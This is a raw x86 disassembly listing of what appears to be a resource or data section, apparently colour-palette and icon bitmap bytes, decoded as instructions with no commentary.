  410ea5:	add    BYTE PTR [esi+0x0],ah
  410ea8:	xor    eax,DWORD PTR [eax]
  410eaa:	data16 add BYTE PTR [esi+0x0],ah
  410eae:	data16 add BYTE PTR [ecx-0x33ff9a00],bl
  410eb5:	add    BYTE PTR [esi+0x0],ah
  410eb8:	inc    DWORD PTR [eax]
  410eba:	data16 add BYTE PTR [eax],al
  410ebd:	xor    esp,DWORD PTR [esi+0x0]
  410ec0:	xor    esi,DWORD PTR [ebx]
  410ec2:	data16 add BYTE PTR [esi+0x33],ah
  410ec6:	data16 add BYTE PTR [ecx-0x33ff99cd],bl
  410ecd:	xor    esp,DWORD PTR [esi+0x0]
  410ed0:	push   DWORD PTR [ebx]
  410ed2:	data16 add BYTE PTR [eax],al
  410ed5:	data16 data16 add BYTE PTR [ebx],dh
  410ed9:	data16 data16 add BYTE PTR [esi+0x66],ah
  410ede:	data16 add BYTE PTR [ecx-0x33ff999a],bl
  410ee5:	data16 data16 add BYTE PTR [eax],al
  410ee9:	cdq    
  410eea:	data16 add BYTE PTR [ebx],dh
  410eed:	cdq    
  410eee:	data16 add BYTE PTR [esi-0x67],ah
  410ef2:	data16 add BYTE PTR [ecx-0x33ff9967],bl
  410ef9:	cdq    
  410efa:	data16 add bh,bh
  410efd:	cdq    
  410efe:	data16 add BYTE PTR [eax],al
  410f01:	int3   
  410f02:	data16 add BYTE PTR [ebx],dh
  410f05:	int3   
  410f06:	data16 add BYTE PTR [ecx-0x33ff9934],bl
  410f0d:	int3   
  410f0e:	data16 add bh,bh
  410f11:	int3   
  410f12:	data16 add BYTE PTR [eax],al
  410f15:	jmp    DWORD PTR [esi+0x0]
  410f18:	xor    edi,edi
  410f1a:	data16 add BYTE PTR [ecx-0x33ff9901],bl
  410f21:	jmp    DWORD PTR [esi+0x0]
  410f24:	inc    DWORD PTR [eax]
  410f26:	int3   
  410f27:	add    ah,cl
  410f29:	add    bh,bh
  410f2b:	add    BYTE PTR [eax],al
  410f2d:	cdq    
  410f2e:	cdq    
  410f2f:	add    BYTE PTR [ecx-0x66ff66cd],bl
  410f35:	add    BYTE PTR [ecx-0x66ff3400],bl
  410f3b:	add    BYTE PTR [eax],al
  410f3d:	add    BYTE PTR [ecx-0x66cccd00],bl
  410f43:	add    BYTE PTR [esi+0x0],ah
  410f46:	cdq    
  410f47:	add    ah,cl
  410f49:	xor    ebx,DWORD PTR [ecx-0x66ff0100]
  410f4f:	add    BYTE PTR [eax],al
  410f51:	cwd    
  410f53:	add    BYTE PTR [ebx],dh
  410f55:	cwd    
  410f57:	add    BYTE PTR [esi+0x33],ah
  410f5a:	cdq    
  410f5b:	add    BYTE PTR [ecx-0x33ff669a],bl
  410f61:	cwd    
  410f63:	add    bh,bh
  410f65:	xor    ebx,DWORD PTR [ecx-0x6666cd00]
  410f6b:	add    BYTE PTR [esi-0x67],ah
  410f6e:	cdq    
  410f6f:	add    BYTE PTR [ecx-0x33ff6667],bl
  410f75:	cdq    
  410f76:	cdq    
  410f77:	add    bh,bh
  410f79:	cdq    
  410f7a:	cdq    
  410f7b:	add    BYTE PTR [eax],al
  410f7d:	int3   
  410f7e:	cdq    
  410f7f:	add    BYTE PTR [ebx],dh
  410f81:	int3   
  410f82:	cdq    
  410f83:	add    BYTE PTR [esi-0x34],ah
  410f86:	data16 add BYTE PTR [ecx-0x33ff6634],bl
  410f8d:	int3   
  410f8e:	cdq    
  410f8f:	add    bh,bh
  410f91:	int3   
  410f92:	cdq    
  410f93:	add    BYTE PTR [eax],al
  410f95:	call   FWORD PTR [ecx-0x6600cd00]
  410f9b:	add    BYTE PTR [esi-0x34],ah
  410f9e:	cdq    
  410f9f:	add    BYTE PTR [ecx-0x33ff6601],bl
  410fa5:	call   FWORD PTR [ecx-0x66000100]
  410fab:	add    BYTE PTR [eax],al
  410fad:	add    ah,cl
  410faf:	add    BYTE PTR [ebx],dh
  410fb1:	add    BYTE PTR [ecx-0x33ff9a00],bl
  410fb7:	add    BYTE PTR [ecx-0x33ff3400],bl
  410fbd:	add    ah,cl
  410fbf:	add    BYTE PTR [eax],al
  410fc1:	xor    ebx,DWORD PTR [ecx-0x33cccd00]
  410fc7:	add    BYTE PTR [esi+0x33],ah
  410fca:	int3   
  410fcb:	add    BYTE PTR [ecx-0x33ff33cd],bl
  410fd1:	xor    ecx,esp
  410fd3:	add    bh,bh
  410fd5:	xor    ecx,esp
  410fd7:	add    BYTE PTR [eax],al
  410fd9:	data16 int3 
  410fdb:	add    BYTE PTR [ebx],dh
  410fdd:	data16 int3 
  410fdf:	add    BYTE PTR [esi+0x66],ah
  410fe2:	cdq    
  410fe3:	add    BYTE PTR [ecx-0x33ff339a],bl
  410fe9:	data16 int3 
  410feb:	add    bh,bh
  410fed:	cwd    
  410fef:	add    BYTE PTR [eax],al
  410ff1:	cdq    
  410ff2:	int3   
  410ff3:	add    BYTE PTR [ebx],dh
  410ff5:	cdq    
  410ff6:	int3   
  410ff7:	add    BYTE PTR [esi-0x67],ah
  410ffa:	int3   
  410ffb:	add    BYTE PTR [ecx-0x33ff3367],bl
  411001:	cdq    
  411002:	int3   
  411003:	add    bh,bh
  411005:	cdq    
  411006:	int3   
  411007:	add    BYTE PTR [eax],al
  411009:	int3   
  41100a:	int3   
  41100b:	add    BYTE PTR [ebx],dh
  41100d:	int3   
  41100e:	int3   
  41100f:	add    BYTE PTR [esi-0x34],ah
  411012:	int3   
  411013:	add    BYTE PTR [ecx-0x33ff3334],bl
  411019:	int3   
  41101a:	int3   
  41101b:	add    bh,bh
  41101d:	int3   
  41101e:	int3   
  41101f:	add    BYTE PTR [eax],al
  411021:	dec    esp
  411023:	add    BYTE PTR [ebx],dh
  411025:	dec    esp
  411027:	add    BYTE PTR [esi-0x1],ah
  41102a:	cdq    
  41102b:	add    BYTE PTR [ecx-0x33ff3301],bl
  411031:	dec    esp
  411033:	add    bh,bh
  411035:	dec    esp
  411037:	add    BYTE PTR [ebx],dh
  411039:	add    ah,cl
  41103b:	add    BYTE PTR [esi+0x0],ah
  41103e:	inc    DWORD PTR [eax]
  411040:	cdq    
  411041:	add    bh,bh
  411043:	add    BYTE PTR [eax],al
  411045:	xor    ecx,esp
  411047:	add    BYTE PTR [ebx],dh
  411049:	xor    edi,edi
  41104b:	add    BYTE PTR [esi+0x33],ah
  41104e:	inc    DWORD PTR [eax]
  411050:	cdq    
  411051:	xor    edi,edi
  411053:	add    ah,cl
  411055:	xor    edi,edi
  411057:	add    bh,bh
  411059:	xor    edi,edi
  41105b:	add    BYTE PTR [eax],al
  41105d:	inc    WORD PTR [eax]
  411060:	xor    esp,DWORD PTR [esi-0x1]
  411063:	add    BYTE PTR [esi+0x66],ah
  411066:	int3   
  411067:	add    BYTE PTR [ecx-0x33ff009a],bl
  41106d:	inc    WORD PTR [eax]
  411070:	jmp    DWORD PTR [esi-0x34]
  411073:	add    BYTE PTR [eax],al
  411075:	cdq    
  411076:	inc    DWORD PTR [eax]
  411078:	xor    ebx,DWORD PTR [ecx-0x6699ff01]
  41107e:	inc    DWORD PTR [eax]
  411080:	cdq    
  411081:	cdq    
  411082:	inc    DWORD PTR [eax]
  411084:	int3   
  411085:	cdq    
  411086:	inc    DWORD PTR [eax]
  411088:	call   FWORD PTR [ecx-0x33ffff01]
  41108e:	inc    DWORD PTR [eax]
  411090:	xor    ecx,esp
  411092:	inc    DWORD PTR [eax]
  411094:	data16 int3 
  411096:	inc    DWORD PTR [eax]
  411098:	cdq    
  411099:	int3   
  41109a:	inc    DWORD PTR [eax]
  41109c:	int3   
  41109d:	int3   
  41109e:	inc    DWORD PTR [eax]
  4110a0:	dec    esp
  4110a2:	inc    DWORD PTR [eax]
  4110a4:	xor    edi,edi
  4110a6:	inc    DWORD PTR [eax]
  4110a8:	dec    sp
  4110ab:	add    BYTE PTR [ecx-0x33ff0001],bl
  4110b1:	(bad)  
  4110b2:	inc    DWORD PTR [eax]
  4110b4:	jmp    DWORD PTR [esi+0x66]
  4110b7:	add    BYTE PTR [esi-0x1],ah
  4110ba:	data16 add bh,bh
  4110bd:	jmp    DWORD PTR [esi+0x0]
  4110c0:	data16 inc WORD PTR [eax]
  4110c4:	jmp    DWORD PTR [esi-0x1]
  4110c7:	add    BYTE PTR [esi-0x1],ah
  4110ca:	inc    DWORD PTR [eax]
  4110cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110cd:	add    BYTE PTR [ecx],ah
  4110cf:	add    BYTE PTR [edi+0x5f],bl
  4110d2:	pop    edi
  4110d3:	add    BYTE PTR [edi+0x77],dh
  4110d6:	ja     0x4110d8
  4110d8:	xchg   BYTE PTR [esi-0x6969ff7a],al
  4110de:	xchg   esi,eax
  4110df:	add    bl,cl
  4110e1:	retf   
  4110e2:	retf   
  4110e3:	add    BYTE PTR [edx-0x28ff4d4e],dh
  4110e9:	xlat   BYTE PTR ds:[ebx]
  4110ea:	xlat   BYTE PTR ds:[ebx]
  4110eb:	add    ch,bl
  4110ed:	fstp   st(5)
  4110ef:	add    bl,ah
  4110f1:	jecxz  0x4110d6
  4110f3:	add    dl,ch
  4110f5:	jmp    0xf1:0xf1f100ea
  4110fc:	clc    
  4110fd:	clc    
  4110fe:	clc    
  4110ff:	add    bh,bh
  411101:	sti    
  411102:	lock add BYTE PTR [eax-0x7fff5b60],ah
  411109:	add    BYTE PTR [eax+0xff00],0x0
  411110:	add    bh,bh
  411112:	add    BYTE PTR [eax],al
  411114:	(bad)  
  411115:	inc    DWORD PTR [eax]
  411117:	add    BYTE PTR [eax],al
  411119:	add    bh,bh
  41111b:	add    bh,bh
  41111d:	add    bh,bh
  41111f:	add    BYTE PTR [eax],al
  411121:	(bad)  
  411122:	inc    DWORD PTR [eax]
  411124:	(bad)  
  411125:	(bad)  
  411126:	inc    DWORD PTR [eax]
	...
  411138:	add    ah,ch
  41113a:	pop    es
  41113b:	add    BYTE PTR [eax],al
  41113d:	in     al,dx
  41113e:	(bad)  
  41113f:	inc    DWORD PTR [edi]
  411141:	(bad)  
  411142:	cli    
  411143:	add    BYTE PTR [eax],al
  411145:	add    BYTE PTR [eax],al
  411147:	add    BYTE PTR [eax],al
  411149:	in     al,dx
  41114a:	pop    es
  41114b:	add    ah,ch
  41114d:	pop    es
  41114e:	pop    es
  41114f:	inc    DWORD PTR [edi]
  411151:	cli    
  411152:	pop    es
  411153:	pop    es
  411154:	add    BYTE PTR [eax],al
  411156:	add    BYTE PTR [eax],al
  411158:	add    ah,ch
  41115a:	pop    es
  41115b:	add    ah,ch
  41115d:	pop    es
  41115e:	pop    es
  41115f:	pop    es
  411160:	add    dl,bh
  411162:	sti    
  411163:	sti    
  411164:	add    BYTE PTR [eax],al
  411166:	add    BYTE PTR [eax],al
  411168:	add    ah,ch
  41116a:	pop    es
  41116b:	add    ah,ch
  41116d:	pop    es
  41116e:	pop    es
  41116f:	sti    
  411170:	add    BYTE PTR [eax],al
  411172:	pop    es
  411173:	pop    es
  411174:	add    BYTE PTR [eax],al
  411176:	add    BYTE PTR [eax],al
  411178:	add    ah,ch
  41117a:	inc    DWORD PTR [eax]
  41117c:	in     al,dx
  41117d:	sti    
  41117e:	pop    es
  41117f:	sti    
  411180:	(bad)  
  411181:	inc    DWORD PTR [edi]
  411183:	pop    es
  411184:	add    BYTE PTR [eax],al
  411186:	add    BYTE PTR [eax],al
  411188:	add    ah,ch
  41118a:	inc    DWORD PTR [eax]
  41118c:	pop    es
  41118d:	in     al,dx
  41118e:	sti    
  41118f:	sti    
  411190:	(bad)  
  411191:	(bad)  
  411192:	inc    DWORD PTR [eax]
  411194:	pop    es
  411195:	pop    es
  411196:	pop    es
  411197:	add    BYTE PTR [eax],al
  411199:	in     al,dx
  41119a:	inc    DWORD PTR [eax]
  41119c:	pop    es
  41119d:	pop    es
  41119e:	add    BYTE PTR [eax],al
  4111a0:	add    BYTE PTR [eax],al
  4111a2:	add    ah,ch
  4111a4:	in     al,dx
  4111a5:	in     al,dx
  4111a6:	pop    es
  4111a7:	add    BYTE PTR [eax],al
  4111a9:	in     al,dx
  4111aa:	in     al,dx
  4111ab:	add    BYTE PTR [edi],al
  4111ad:	pop    es
  4111ae:	in     al,dx
  4111af:	in     al,dx
  4111b0:	in     al,dx
  4111b1:	in     al,dx
  4111b2:	in     al,dx
  4111b3:	in     al,dx
  4111b4:	in     al,dx
  4111b5:	in     al,dx
  4111b6:	pop    es
  4111b7:	add    ah,ch
  4111b9:	(bad)  
  4111ba:	(bad)  
  4111bb:	in     al,dx
  4111bc:	pop    es
  4111bd:	pop    es
  4111be:	in     al,dx
  4111bf:	pop    es
  4111c0:	pop    es
  4111c1:	pop    es
  4111c2:	pop    es
  4111c3:	pop    es
  4111c4:	pop    es
  4111c5:	pop    es
  4111c6:	in     al,dx
  4111c7:	add    BYTE PTR [eax],al
  4111c9:	in     al,dx
  4111ca:	in     al,dx
  4111cb:	in     al,dx
  4111cc:	in     al,dx
  4111cd:	pop    es
  4111ce:	in     al,dx
  4111cf:	outs   dx,DWORD PTR ds:[esi]
  4111d0:	jp     0x411224
  4111d2:	xor    DWORD PTR [ebp+0x4c],ecx
  4111d5:	(bad)  
  4111d6:	in     al,dx
  4111d7:	add    BYTE PTR [eax],al
  4111d9:	add    BYTE PTR [eax],al
  4111db:	in     al,dx
  4111dc:	(bad)  
  4111dd:	(bad)  
  4111de:	in     al,dx
  4111df:	outs   dx,DWORD PTR ds:[esi]
  4111e0:	in     eax,0x7a
  4111e2:	push   edx
  4111e3:	xor    DWORD PTR [ebp-0x1],ecx
  4111e6:	in     al,dx
  4111e7:	add    BYTE PTR [eax],al
  4111e9:	add    BYTE PTR [eax],al
  4111eb:	add    ah,ch
  4111ed:	in     al,dx
  4111ee:	in     al,dx
  4111ef:	outs   dx,DWORD PTR ds:[esi]
  4111f0:	in     eax,0xe5
  4111f2:	jp     0x411246
  4111f4:	xor    edi,edi
  4111f6:	in     al,dx
  4111f7:	add    BYTE PTR [eax],al
  4111f9:	add    BYTE PTR [eax],al
  4111fb:	add    BYTE PTR [eax],al
  4111fd:	add    ah,ch
  4111ff:	outs   dx,DWORD PTR ds:[esi]
  411200:	jp     0x4111e7
  411202:	in     eax,0x7a
  411204:	push   edx
  411205:	(bad)  
  411206:	in     al,dx
  411207:	add    BYTE PTR [eax],al
  411209:	add    BYTE PTR [eax],al
  41120b:	add    BYTE PTR [eax],al
  41120d:	add    ah,ch
  41120f:	outs   dx,DWORD PTR ds:[esi]
  411210:	dec    esp
  411211:	dec    esp
  411212:	dec    esp
  411213:	dec    esp
  411214:	dec    esp
  411215:	(bad)  
  411216:	in     al,dx
  411217:	add    BYTE PTR [eax],al
  411219:	add    BYTE PTR [eax],al
  41121b:	add    BYTE PTR [eax],al
  41121d:	add    ah,ch
  41121f:	lock lock lock lock lock lock lock in al,dx
  411227:	add    BYTE PTR [edi+ebx*1+0xf800000],cl
  41122e:	add    BYTE PTR [eax],al
  411230:	add    BYTE PTR [edi],0x0
  411233:	add    BYTE PTR [eax-0x7ffffff9],al
  411239:	pop    es
  41123a:	add    BYTE PTR [eax],al
  41123c:	add    BYTE PTR [ecx],0x0
  41123f:	add    BYTE PTR [eax-0x80000000],al
  411245:	add    BYTE PTR [eax],al
  411247:	add    BYTE PTR [eax+0x0],al
  41124d:	add    BYTE PTR [eax],al
  41124f:	add    BYTE PTR [eax-0x20000000],al
  411255:	add    BYTE PTR [eax],al
  411257:	add    al,dh
  411259:	add    BYTE PTR [eax],al
  41125b:	add    ah,bh
  41125d:	add    BYTE PTR [eax],al
  41125f:	add    ah,bh
  411261:	add    BYTE PTR [eax],al
  411263:	add    ah,bh
  411265:	add    BYTE PTR [eax],al
  411267:	add    BYTE PTR [eax],ch
  411269:	add    BYTE PTR [eax],al
  41126b:	add    BYTE PTR [eax],ah
  41126d:	add    BYTE PTR [eax],al
  41126f:	add    BYTE PTR [eax+0x0],al
  411272:	add    BYTE PTR [eax],al
  411274:	add    DWORD PTR [eax],eax
  411276:	add    al,0x0
  411278:	add    BYTE PTR [eax],al
  41127a:	add    BYTE PTR [eax],al
  41127c:	add    BYTE PTR [edx],0x0
	...
  411293:	add    BYTE PTR [eax],al
  411295:	add    BYTE PTR [eax],0x0
  411298:	add    BYTE PTR [eax],0x0
  41129b:	add    BYTE PTR [eax+0x80],al
  4112a1:	add    BYTE PTR [eax-0x7f800000],al
  4112a7:	add    BYTE PTR [eax-0x7fff8000],al
  4112ad:	add    BYTE PTR [eax-0x3f3f4000],0x0
  4112b4:	add    bh,bh
  4112b6:	add    BYTE PTR [eax],al
  4112b8:	inc    DWORD PTR [eax]
  4112ba:	add    BYTE PTR [eax],al
  4112bc:	(bad)  
  4112bd:	inc    DWORD PTR [eax]
  4112bf:	add    BYTE PTR [eax],al
  4112c1:	add    bh,bh
  4112c3:	add    BYTE PTR [eax],al
  4112c5:	(bad)  
  4112c6:	inc    DWORD PTR [eax]
  4112c8:	inc    DWORD PTR [eax]
  4112ca:	inc    DWORD PTR [eax]
  4112cc:	(bad)  
  4112cd:	(bad)  
  4112ce:	inc    DWORD PTR [eax]
  4112d0:	add    BYTE PTR [eax],al
  4112d2:	add    BYTE PTR [eax],al
  4112d4:	add    BYTE PTR [eax],al
  4112d6:	add    BYTE PTR [edi],al
  4112d8:	ja     0x4112da
	...
  4112e6:	pop    es
  4112e7:	js     0x411276
  4112e9:	fst    QWORD PTR [eax+0x0]
  4112ef:	add    BYTE PTR [eax],al
  4112f1:	js     0x4112eb
  4112f3:	lock add BYTE PTR [eax],al
  4112f6:	jg     0x411287
  4112f8:	mov    ch,bl
  4112fa:	cdq    
  4112fb:	nop
  4112fc:	add    BYTE PTR [eax],al
  4112fe:	add    BYTE PTR [eax],al
  411300:	add    BYTE PTR [edi-0x71],bh
  411303:	xor    BYTE PTR [eax+0x7],0x87
  411307:	clc    
  411308:	std    
  411309:	fstp   DWORD PTR [ecx+0x88]
  41130f:	add    BYTE PTR [eax],al
  411311:	js     0x41130b
  411313:	lock xchg DWORD PTR [edi],eax
  411316:	js     0x411397
  411318:	mov    cl,bl
  41131a:	cwde   
  41131b:	mov    BYTE PTR [eax],al
  41131d:	add    BYTE PTR [eax],al
  41131f:	add    BYTE PTR [eax],al
  411321:	jg     0x4112b2
  411323:	cmp    BYTE PTR [eax+0x77],0x87
  411327:	xchg   eax,edi
  411329:	(bad)  [eax+0xb08b]
  41132f:	add    BYTE PTR [eax],al
  411331:	js     0x41132b
  411333:	lock xchg DWORD PTR [eax+0x78],edi
  411337:	js     0x4113a9
  411339:	or     DWORD PTR [ebx+0xb0bb],ecx
  41133f:	add    BYTE PTR [eax],al
  411341:	jg     0x4112d2
  411343:	cmp    BYTE PTR [eax+0x77],0x87
  411347:	xchg   DWORD PTR [eax],eax
  411349:	add    BYTE PTR [ebx+0x80b8],bh
  41134f:	add    BYTE PTR [eax],al
  411351:	js     0x41134b
  411353:	lock xchg DWORD PTR [eax-0x78],edi
  411357:	mov    ebx,0x78780000
  41135c:	jo     0x41135e
  41135e:	add    BYTE PTR [eax],al
  411360:	add    BYTE PTR [edi-0x71],bh
  411363:	cmp    BYTE PTR [eax+0x78],0xbb
  411367:	mov    DWORD PTR [eax-0x7f7878f9],esi
  41136d:	add    BYTE PTR [eax],al
  41136f:	add    BYTE PTR [eax],al
  411371:	jg     0x411372
  411373:	lock xchg DWORD PTR [ebx-0x48],edi
  411377:	fwait
  411378:	mov    ebp,0x707878ff
  41137d:	add    BYTE PTR [eax],al
  41137f:	add    BYTE PTR [eax],al
  411381:	jg     0x411382
  411383:	lock js 0x4113fd
  411386:	mov    DWORD PTR [ebx-0x78080743],edi
  41138c:	add    BYTE PTR [eax],al
  41138e:	add    BYTE PTR [eax],al
  411390:	add    BYTE PTR [edi-0x1],bh
  411393:	lock xchg DWORD PTR [edi-0x70224465],eax
  41139a:	(bad)  
  41139b:	js     0x4113a5
  41139d:	mov    BYTE PTR [eax-0x810000],cl
  4113a3:	lock mov BYTE PTR [eax-0x77224285],cl
  4113aa:	clc    
  4113ab:	lock add BYTE PTR [eax],al
  4113ae:	mov    BYTE PTR [eax+0x0],dh
  4113b1:	jg     0x4113b2
  4113b3:	lock mov BYTE PTR [eax-0x772282f9],cl
  4113ba:	add    BYTE PTR [edi],0x77
  4113bd:	ja     0x411347
  4113bf:	jo     0x4113c1
  4113c1:	jg     0x4113c2
  4113c3:	lock mov BYTE PTR [eax+0x7777f70f],cl
  4113ca:	jg     0x4113cb
  4113cc:	(bad)  
  4113cd:	(bad)  
  4113ce:	push   DWORD PTR [eax+0x0]
  4113d1:	ja     0x41144a
  4113d3:	jo     0x41135d
  4113d5:	mov    BYTE PTR [edi],al
  4113d7:	ja     0x411450
  4113d9:	ja     0x411452
  4113db:	ja     0x411454
  4113dd:	ja     0x411457
  4113df:	jo     0x4113e1
  4113e1:	ja     0x41145a
  4113e3:	jo     0x41136d
  4113e5:	mov    BYTE PTR [eax],al
	...
  4113ef:	add    BYTE PTR [edi],0xff
  4113f2:	push   edi
  4113f4:	or     BYTE PTR [eax-0x777777f9],cl
  4113fa:	mov    BYTE PTR [eax+0x878888],cl
  411400:	ja     0x411479
  411402:	ja     0x41147b
  411404:	jo     0x41138e
  411406:	pop    es
  411407:	(bad)  
  411408:	(bad)  
  411409:	(bad)  
  41140a:	(bad)  
  41140b:	(bad)  
  41140c:	(bad)  
  41140d:	inc    DWORD PTR [edi+0x7000000]
  411413:	ja     0x41148c
  411415:	or     BYTE PTR [edi],al
  411417:	repnz and ah,BYTE PTR [edx]
  41141a:	and    ah,BYTE PTR [edx]
  41141c:	and    ch,BYTE PTR [edi]
  41141e:	xchg   DWORD PTR [eax],eax
  411420:	add    BYTE PTR [eax],al
  411422:	add    BYTE PTR [edi+0x77],dh
  411425:	jo     0x41142e
  411427:	repnz mov eax,0xaa3a3383
  41142d:	das    
  41142e:	xchg   DWORD PTR [eax],eax
  411430:	add    BYTE PTR [eax],al
  411432:	add    BYTE PTR [edi],al
  411434:	(bad)  
  411435:	inc    DWORD PTR [edi]
  411437:	repnz sti 
  411439:	mov    BYTE PTR [ebx],dh
  41143b:	xor    ebp,DWORD PTR [edx+0x872f]
  411441:	add    BYTE PTR [eax],al
  411443:	add    BYTE PTR [edi+0x77],dh
  411446:	jo     0x41143a
  411448:	mov    edi,0x3a3383b8
  41144d:	das    
  41144e:	xchg   DWORD PTR [eax],eax
  411450:	add    BYTE PTR [eax],al
  411452:	add    BYTE PTR [eax],al
  411454:	add    BYTE PTR [eax],al
  411456:	pop    es
  411457:	repnz sti 
  411459:	sti    
  41145a:	mov    BYTE PTR [ebx],dh
  41145c:	xor    ebp,DWORD PTR [edi]
  41145e:	xchg   DWORD PTR [eax],eax
  411460:	add    BYTE PTR [eax],al
  411462:	add    BYTE PTR [eax],al
  411464:	add    BYTE PTR [eax],al
  411466:	pop    es
  411467:	repnz mov edi,0x3383b8bf
  41146d:	das    
  41146e:	xchg   DWORD PTR [eax],eax
  411470:	add    BYTE PTR [eax],al
  411472:	add    BYTE PTR [eax],al
  411474:	add    BYTE PTR [eax],al
  411476:	pop    es
  411477:	repnz mov edi,ebx
  41147a:	sti    
  41147b:	mov    BYTE PTR [ebx],dh
  41147d:	das    
  41147e:	xchg   DWORD PTR [eax],eax
  411480:	add    BYTE PTR [eax],al
  411482:	add    BYTE PTR [eax],al
  411484:	add    BYTE PTR [eax],al
  411486:	pop    es
  411487:	repnz mov BYTE PTR [edi+0x2f83b8bf],bh
  41148e:	xchg   DWORD PTR [eax],eax
  411490:	add    BYTE PTR [eax],al
  411492:	add    BYTE PTR [eax],al
  411494:	add    BYTE PTR [eax],al
  411496:	pop    es
  411497:	repnz mov BYTE PTR [ebx+0x2f88fbfb],cl
  41149e:	xchg   DWORD PTR [eax],eax
  4114a0:	add    BYTE PTR [eax],al
  4114a2:	add    BYTE PTR [eax],al
  4114a4:	add    BYTE PTR [eax],al
  4114a6:	pop    es
  4114a7:	repnz and ah,BYTE PTR [edx]
  4114aa:	and    ah,BYTE PTR [edx]
  4114ac:	and    ch,BYTE PTR [edi]
  4114ae:	xchg   DWORD PTR [eax],eax
  4114b0:	add    BYTE PTR [eax],al
  4114b2:	add    BYTE PTR [eax],al
  4114b4:	add    BYTE PTR [eax],al
  4114b6:	pop    es
  4114b7:	(bad)  
  4114b8:	(bad)  
  4114b9:	(bad)  
  4114ba:	(bad)  
  4114bb:	(bad)  
  4114bc:	(bad)  
  4114bd:	inc    DWORD PTR [edi+0x0]
  4114c3:	add    BYTE PTR [eax],al
  4114c5:	add    BYTE PTR [eax],al
  4114c7:	ja     0x411540
  4114c9:	ja     0x411542
  4114cb:	ja     0x411544
  4114cd:	ja     0x411546
  4114cf:	add    bh,bh
  4114d1:	inc    BYTE PTR [edi]
  4114d3:	inc    eax
  4114d5:	clc    
  4114d6:	add    edi,edi
  4114d8:	shl    BYTE PTR [eax+0x0],0xff
  4114dc:	shl    BYTE PTR [eax],0x0
  4114df:	jg     0x4114a1
  4114e1:	add    BYTE PTR [eax],al
  4114e3:	jg     0x4114a5
  4114e5:	add    BYTE PTR [eax],al
  4114e7:	aas    
  4114e8:	rol    BYTE PTR [eax],0x0
  4114eb:	aas    
  4114ec:	rol    BYTE PTR [eax],0x60
  4114ef:	aas    
  4114f0:	rol    BYTE PTR [eax],0x60
  4114f3:	aas    
  4114f4:	rol    BYTE PTR [eax],0x0
  4114f7:	aas    
  4114f8:	rol    BYTE PTR [eax],0x0
  4114fb:	aas    
  4114fc:	rol    BYTE PTR [eax],0x0
  4114ff:	add    eax,eax
  411501:	add    BYTE PTR [eax],al
  411503:	add    eax,eax
  411505:	add    BYTE PTR [eax],al
  411507:	add    al,al
  411509:	add    BYTE PTR [eax],al
  41150b:	add    al,al
  41150d:	add    BYTE PTR [eax],al
  41150f:	add    al,al
  411511:	add    BYTE PTR [eax],al
  411513:	add    al,al
  411515:	add    BYTE PTR [eax],al
  411517:	add    BYTE PTR [eax+0x10000],al
  41151d:	add    BYTE PTR [eax],al
  41151f:	add    eax,edi
  411521:	add    BYTE PTR [eax],al
  411523:	add    esp,edi
  411525:	add    BYTE PTR [eax],al
  411527:	add    esi,edi
  411529:	add    BYTE PTR [eax],al
  41152b:	add    edi,edi
  41152d:	add    BYTE PTR [eax],al
  41152f:	add    edi,edi
  411531:	clc    
  411532:	add    BYTE PTR [ecx],al
  411534:	(bad)  
  411535:	clc    
  411536:	add    BYTE PTR [ecx],al
  411538:	(bad)  
  411539:	clc    
  41153a:	add    BYTE PTR [ecx],al
  41153c:	(bad)  
  41153d:	clc    
  41153e:	add    BYTE PTR [ecx],al
  411540:	(bad)  
  411541:	clc    
  411542:	add    BYTE PTR [ecx],al
  411544:	(bad)  
  411545:	clc    
  411546:	add    BYTE PTR [ecx],al
  411548:	(bad)  
  411549:	clc    
  41154a:	add    BYTE PTR [ecx],al
  41154c:	(bad)  
  41154d:	cld    
  41154e:	add    BYTE PTR [ebx],al
  411550:	sub    BYTE PTR [eax],al
  411552:	add    BYTE PTR [eax],al
  411554:	and    BYTE PTR [eax],al
  411556:	add    BYTE PTR [eax],al
  411558:	inc    eax
  411559:	add    BYTE PTR [eax],al
  41155b:	add    BYTE PTR [ecx],al
  41155d:	add    BYTE PTR [eax],cl
  41155f:	add    BYTE PTR [eax],al
  411561:	add    BYTE PTR [eax],al
  411563:	add    BYTE PTR [eax+0x4],al
	...
  411579:	add    BYTE PTR [eax],al
  41157b:	add    BYTE PTR [eax+0x0],al
  411581:	add    BYTE PTR [eax],0x0
  411584:	add    BYTE PTR [eax+0x0],0x80
  41158b:	add    BYTE PTR [eax+0x8000],al
  411591:	add    BYTE PTR [eax-0x3f3f4000],0x0
  411598:	rcr    ah,0xc0
  41159b:	add    BYTE PTR [esi+0x400f0ca],ah
  4115a1:	add    al,0x4
  4115a3:	add    BYTE PTR [eax],cl
  4115a5:	or     BYTE PTR [eax],cl
  4115a7:	add    BYTE PTR [esp+ecx*1],cl
  4115aa:	or     al,0x0
  4115ac:	adc    DWORD PTR [ecx],edx
  4115ae:	adc    DWORD PTR [eax],eax
  4115b0:	push   ss
  4115b1:	push   ss
  4115b2:	push   ss
  4115b3:	add    BYTE PTR [esp+ebx*1],bl
  4115b6:	sbb    al,0x0
  4115b8:	and    ah,BYTE PTR [edx]
  4115ba:	and    al,BYTE PTR [eax]
  4115bc:	sub    DWORD PTR [ecx],ebp
  4115be:	sub    DWORD PTR [eax],eax
  4115c0:	push   ebp
  4115c1:	push   ebp
  4115c2:	push   ebp
  4115c3:	add    BYTE PTR [ebp+0x4d],cl
  4115c6:	dec    ebp
  4115c7:	add    BYTE PTR [edx+0x42],al
  4115ca:	inc    edx
  4115cb:	add    BYTE PTR [ecx],bh
  4115cd:	cmp    DWORD PTR [ecx],edi
  4115cf:	add    bh,bh
  4115d1:	jl     0x411553
  4115d3:	add    bh,bh
  4115d5:	push   eax
  4115d6:	push   eax
  4115d7:	add    dh,dl
  4115d9:	add    BYTE PTR [ebx-0x133400],dl
  4115df:	add    bh,ch
  4115e1:	(bad)  
  4115e2:	mov    BYTE PTR [eax],0xe7
  4115e5:	out    0xd6,eax
  4115e7:	add    BYTE PTR [ebp+0x330090a9],ch
  4115ed:	add    BYTE PTR [eax],al
  4115ef:	add    BYTE PTR [esi+0x0],ah
  4115f2:	add    BYTE PTR [eax],al
  4115f4:	cdq    
  4115f5:	add    BYTE PTR [eax],al
  4115f7:	add    ah,cl
  4115f9:	add    BYTE PTR [eax],al
  4115fb:	add    BYTE PTR [eax],al
  4115fd:	xor    eax,DWORD PTR [eax]
  4115ff:	add    BYTE PTR [ebx],dh
  411601:	xor    eax,DWORD PTR [eax]
  411603:	add    BYTE PTR [esi+0x33],ah
